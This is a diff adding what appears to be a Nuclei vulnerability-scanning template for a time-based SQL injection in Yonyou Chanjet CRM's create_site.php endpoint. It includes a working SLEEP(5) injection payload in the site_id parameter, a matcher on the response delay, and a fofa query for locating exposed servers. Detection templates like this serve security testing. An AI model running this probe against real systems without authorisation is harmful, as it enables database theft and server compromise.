@@ -1,0 +1,41 @@
+id: changjietongCRM-create_site-sqli
+
+info:
+  name: 用友畅捷通CRM-create_site.php-SQL注入漏洞
+  author: candada
+  severity: high
+  description: '用友畅捷通T-CRM是用友公司全力打造的一款基于B/S架构、拥有强大自定义功能、多部门协作(市场、销售和服务)、基于客户全生命周期管理的客户关系管理软件。客户通主要面向成长型中小企业，以客户为中心，以客户营销为目的，帮助他们 " 提升营销能力，网罗天下商机"。畅捷CRM系统create_site.php存在SQL注入漏洞 ，攻击者可以利用该漏洞获取网站后台数据库敏感信息，甚至接管服务器权限，构成严重风险。'
+  reference:
+    - https://
+  tags: 2024,畅捷通,sqli,yonyou-turbocrm
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="畅捷CRM"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+
+http:
+  - raw:
+      - |+
+        GET /webservice/create_site.php?site_id=1%20AND%20SLEEP(5)--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: PHPSESSID=c46a43947ad2ebbabcfd547bd0b1cc1d
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && duration>=5 && duration<=7"
